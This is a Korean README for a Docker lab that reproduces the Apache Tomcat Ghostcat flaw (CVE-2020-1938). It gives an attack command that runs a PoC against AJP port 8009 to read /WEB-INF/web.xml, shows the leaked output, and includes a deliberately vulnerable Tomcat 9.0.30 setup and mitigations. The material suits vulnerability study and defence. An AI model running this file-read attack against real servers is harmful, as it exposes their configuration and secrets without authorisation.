# CVE-2020-1938 - Ghostcat (Apache Tomcat AJP File Read Vulnerability)

## 개요

**CVE-2020-1938**, 일명 **Ghostcat**은 Apache Tomcat의 AJP 커넥터(AJP/1.3 프로토콜)를 악용해 인증 없이 Tomcat 내부의 민감 파일을 읽을 수 있는 취약점입니다.  
AJP 포트가 외부에 노출되어 있는 경우, 공격자는 `/WEB-INF/web.xml` 등 서버 내부 파일을 사용자 입력값 검증없이 열람 및 실행이 가능합니다.

- **취약점 ID:** CVE-2020-1938  
- **공개일:** 2020-02-20 
- **취약점 유형:** 정보 유출 (Information Disclosure)  
- **PoC 가능 여부:** 가능 (Docker 환경 구성 완료)

---

## 환경 구성 방법

### 1. 실행 환경 (Docker)

```bash
git clone https://github.com/kimyeeun21/kr-vulhub.git
cd kr-vulhub/CVE-2020-1938
docker compose up -d  명령어로 Apache Tomcat 실행
```

- 브라우저에서 `http://localhost:8080` 접속 → Tomcat 정상 구동 확인
- 컨테이너는 포트 8080(HTTP), 8009(AJP)을 연다

---

## PoC 실행 방법

### 1. 사전 준비

- Python 3.12.9 설치

### 2. 공격 명령어

```bash
python poc.py 127.0.0.1 -p 8009 -f /WEB-INF/web.xml
```

### 3. PoC 성공 결과

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         version="4.0" metadata-complete="true">
  <display-name>Welcome to Tomcat</display-name>
  <description>Welcome to Tomcat</description>
</web-app>
```

> Tomcat의 내부 설정 파일(web.xml)을 성공적으로 열람할 수 있었습니다.

---

## PoC 환경 구성 파일

### docker-compose.yml

```yaml
version: '2'
services:
  tomcat:
    image: tomcat:9.0.30
    ports:
      - "8080:8080"
      - "8009:8009"
```

### Dockerfile

```dockerfile
FROM tomcat:9.0.30
```

### poc.py

- Vulhub의 [PoC 코드](https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2020-1938/poc.py)를 사용
- Python 3.11 이상 호환을 위해 `bufsize` 제거, `bytes.decode()`로 출력 처리

---

## 대응 방안

| 조치              | 설명                                                    |
|-------------------|---------------------------------------------------------|
| AJP 비활성화   | `server.xml`에서 AJP 커넥터 제거 또는 주석 처리        |
| 방화벽 설정    | 8009 포트를 외부에서 접근하지 못하도록 방화벽 차단     |
| ⬆버전 업그레이드 | Apache Tomcat을 9.0.31 이상으로 업그레이드              |

### `server.xml` 예시 (AJP 주석 처리)

Tomcat 설정 파일인 `server.xml`에서 AJP 포트를 주석 처리하면 외부에서 해당 포트 접근이 차단됩니다.

```xml
<!--
<Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />
-->
---

## 📎 참고 자료

- [CVE-2020-1938 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)
- [Tenable - Ghostcat 상세 분석](https://www.tenable.com/blog/ghostcat-vulnerability-discovered-in-apache-tomcat-cve-2020-1938)
- [Vulhub - CVE 환경](https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2020-1938)



## ✅ PoC 결과 캡처

![PoC 실행 결과](./xml_result.png")

---

## 🔗 제출 정보

- **GitHub Repo:** https://github.com/kimyeeun21/kr-vulhub 
- **Pull Request:** [PR 생성 후 링크 입력]

